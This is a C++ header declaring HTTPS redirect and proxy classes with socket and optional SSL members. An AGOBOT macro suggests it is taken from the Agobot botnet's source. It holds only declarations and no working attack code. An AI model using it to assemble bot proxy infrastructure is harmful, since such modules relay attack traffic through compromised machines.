
#ifndef __REDIR_HTTPS_H__
#define __REDIR_HTTPS_H__

#include "cstring.h"
#include "redirect.h"
#include "utility.h"
#include "ssllib.h"

class CRedirectHTTPS;
class CRedirectHTTPS_Thread;

class CRedirectHTTPS_Thread : public CRedirectBase
{
public:
	CRedirectHTTPS_Thread();
	virtual void StartRedirect();
	virtual ~CRedirectHTTPS_Thread() throw() { }

	CRedirectHTTPS				*m_pRedirHTTPS;

#ifndef AGOBOT_NO_OPENSSL
	CSSLSocket					 m_csslSocket;		// The SSL socket
#endif // AGOBOT_NO_OPENSSL
	int							 m_iConnections;
	CSocket						 m_sClientSocket;
	CSocket						 m_sServerSocket;
};

class CRedirectHTTPS : public CRedirectBase
{
public:
	CRedirectHTTPS();
	virtual void StartRedirect();
	virtual ~CRedirectHTTPS() throw() { }

	void HTTPSProxy();

	bool						 m_bUseSSL;
	CSocket						 m_sListenSocket;
};

#endif // __REDIR_HTTPS_H__
